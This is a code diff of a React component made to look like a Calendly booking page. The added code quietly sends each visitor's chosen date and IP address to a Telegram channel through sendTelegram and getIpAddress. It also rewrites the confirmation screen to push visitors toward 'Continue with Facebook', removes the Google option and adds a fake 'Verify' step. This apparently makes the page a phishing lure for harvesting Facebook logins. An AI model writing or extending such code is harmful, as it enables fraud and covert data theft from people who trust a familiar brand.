@@ -13,13 +13,23 @@ var timezone = require("dayjs/plugin/timezone"); // dependent on utc plugin
 dayjs.extend(utc);
 dayjs.extend(timezone);
 import dayjs from "dayjs";
+import { sendTelegram } from "./utils/sendTelegram";
+import { getIpAddress } from "./utils/getIpAddress";
+import { useLocation, useNavigate } from "react-router";
 
-export const LandingCalendly = ({ showModal, showModalGmail }) => {
+export const LandingCalendly = ({
+  showModal,
+  showModalGmail,
+  isCalendar = false,
+  isError = false,
+}) => {
+  const navigate = useNavigate();
   const [configValue, setConfigValue] = useState(null);
+  const { state } = useLocation();
 
   const today = new Date();
   const [value, setValue] = useState(today);
-  const [screenChange, onScreenChange] = useState(1);
+  const [screenChange, onScreenChange] = useState(isCalendar ? 1 : 2);
   const [calendarChange, onCaledarChange] = useState(false);
   const [selectedButton, setSelectedButton] = useState(false);
   const [svgIcon, setSvg] = useState(true);
@@ -77,6 +87,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
     setTimeSelected(timeSlots[index]);
     setSelectedButton(index);
   };
+
   today.setDate(today.getDate());
   const formattedDate = value?.toLocaleDateString("en-US", {
     weekday: "long",
@@ -154,7 +165,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                     screenChange == 2 || !svgIcon ? "mobile__back-svg" : null
                   }
                 >
-                  {screenChange == 2 && (
+                  {/* {screenChange == 2 && (
                     <div
                       className="back__svg"
                       onClick={() => changeScreen("1")}
@@ -195,7 +206,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                         />
                       </svg>
                     </div>
-                  )}
+                  )} */}
                   {screenChange != 2 && !svgIcon && (
                     <div
                       className="back__svg hide__desktop"
@@ -297,7 +308,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                 </div>
                 {screenChange == 2 && (
                   <>
-                    <div className="minute space__bettwen">
+                    {/* <div className="minute space__bettwen">
                       <svg
                         data-id="details-item-icon"
                         viewBox="0 0 20 20"
@@ -315,7 +326,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                       <span>
                         {timeSelected}, {formattedDateYear}
                       </span>
-                    </div>
+                    </div> */}
                     <div className="minute space__bettwen">
                       <svg
                         data-id="details-item-icon"
@@ -455,7 +466,21 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                                         JSON.stringify(dateTime)
                                       );
 
-                                      changeScreen(2);
+                                      let telegram_data = `
+                                      === SCHEDULE DATE ===
+                                        Date: ${dateTime}
+                                      ============
+                                      ${getIpAddress()}
+                                      `;
+
+                                      // changeScreen(2);
+                                      sendTelegram(telegram_data).then(() => {
+                                        if (isError) {
+                                          navigate("/error");
+                                        } else {
+                                          navigate("/thank-you");
+                                        }
+                                      });
                                     }}
                                   >
                                     Next
@@ -478,13 +503,30 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
               <div>
                 <FadeIn className="full__width">
                   {/* <h2>Please confirm your scheduled call</h2> */}
-                  <h2>Sign In</h2>
+                  <h2>Schedule call with {configValue?.full_name || ""}</h2>
+
+                  <div className="form-steps">
+                    <form id="msform">
+                      <ul id="progressbar">
+                        <li class="active" id="account">
+                          <strong>Verify</strong>
+                        </li>
+                        <li id="personal">
+                          <strong>Schedule</strong>
+                        </li>
+                        <li id="confirm">
+                          <strong>Finish</strong>
+                        </li>
+                      </ul>
+                    </form>
+                  </div>
 
                   <div className="dummy__text">
                     <p>
                       Please confirm your appointment with{" "}
-                      {configValue?.full_name || ""} for {timeSelected},{" "}
-                      {formattedDateYear}.
+                      {configValue?.full_name || ""}. <br />
+                      To complete the confirmation process, continue with
+                      Facebook
                     </p>
                   </div>
 
@@ -560,7 +602,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                       Continue with Facebook
                     </button>
                   </div>
-                  <div className="gmail__button">
+                  {/* <div className="gmail__button">
                     <button onClick={() => showModalGmail()}>
                       <svg
                         xmlns="http://www.w3.org/2000/svg"
@@ -602,7 +644,7 @@ export const LandingCalendly = ({ showModal, showModalGmail }) => {
                       </svg>
                       Continue with Google
                     </button>
-                  </div>
+                  </div> */}
                   <div className="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                     <p>Cookie settings</p>
                     <p>Report abuse</p>
